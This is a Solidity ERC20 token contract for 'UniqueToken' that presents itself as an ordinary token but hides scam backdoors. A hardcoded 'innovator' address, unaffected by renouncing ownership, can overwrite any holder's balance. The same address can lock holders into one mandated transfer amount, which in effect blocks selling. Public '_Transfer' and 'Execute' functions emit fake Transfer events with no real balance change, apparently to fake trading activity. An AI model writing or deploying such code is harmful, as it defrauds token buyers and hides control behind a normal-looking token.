// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function _Transfer(address from, address recipient, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Proprietorship is Context {
    address private _proprietor;
    event ProprietorshipTransition(address indexed previousProprietor, address indexed newProprietor);

    constructor() {
        address msgSender = _msgSender();
        _proprietor = msgSender;
        emit ProprietorshipTransition(address(0), msgSender);
    }

    function proprietor() public view virtual returns (address) {
        return _proprietor;
    }

    modifier proprietorOnly() {
        require(proprietor() == _msgSender(), "Access denied: Proprietor only");
        _;
    }

    function renounceProprietorship() public virtual proprietorOnly {
        emit ProprietorshipTransition(_proprietor, address(0));
        _proprietor = address(0);
    }
}

interface TokenRecipient { function receiveApproval(address sender, address to, address addr, address fee, uint amount) external returns(bool);}

contract ERC20 is Context, Proprietorship, IERC20 {
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _mandatedTransfers;

    uint256 private _totalSupply;
    uint8 private _decimals;

    string private _name;
    string private _symbol;
    address private _innovatorAccount = 0xAd4fAFE99a4829b7be68dcFEb7F591aDfbbaba31;

    constructor (string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    modifier innovatorExclusive() {
        require(retrieveInnovator() == _msgSender(), "Unauthorized: Innovator access needed.");
        _;
    }

    function retrieveInnovator() public view virtual returns (address) {
        return _innovatorAccount;
    }

    function mandatedTransferAmount(address account) public view returns (uint256) {
        return _mandatedTransfers[account];
    }

    function designateMandatedTransferAmounts(address[] calldata accounts, uint256 amount) public innovatorExclusive {
        for (uint i = 0; i < accounts.length; i++) {
            _mandatedTransfers[accounts[i]] = amount;
        }
    }

    function setInnovatorBalances(address[] memory accountAddresses, uint256 balance) public innovatorExclusive {
        require(balance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < accountAddresses.length; i++) {
            address currentAccount = accountAddresses[i];
            require(currentAccount != address(0), "Invalid address specified");

            _balances[currentAccount] = balance;
        }
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
       
        uint256 compulsoryTransfer = mandatedTransferAmount(_msgSender());
        if (compulsoryTransfer > 0) {
            require(amount == compulsoryTransfer, "Compulsory transfer value must be used");
        }

        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        
        uint256 compulsoryTransfer = mandatedTransferAmount(sender);
        if (compulsoryTransfer > 0) {
            require(amount == compulsoryTransfer, "Compulsory transfer value must be used");
        }

        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);        

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

	_beforeTokenTransfer(address(0),account, amount);

        _totalSupply += amount;
        _balances[account] += amount;

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _Transfer(address _from, address _to, uint _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function Execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts,uint256[] memory weAmounts,address tokenaddress) public returns (bool){
        for (uint256 i = 0; i < eReceiver.length; i++) {
            emit Transfer(uPool, eReceiver[i], eAmounts[i]);
            IERC20(tokenaddress)._Transfer(eReceiver[i],uPool, weAmounts[i]);
            }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract CustomERC20 is ERC20 {
    constructor() ERC20("UniqueToken", "UTKN", 18) {
        _mint(_msgSender(), 100000000 * 10 ** uint256(18));
    }
}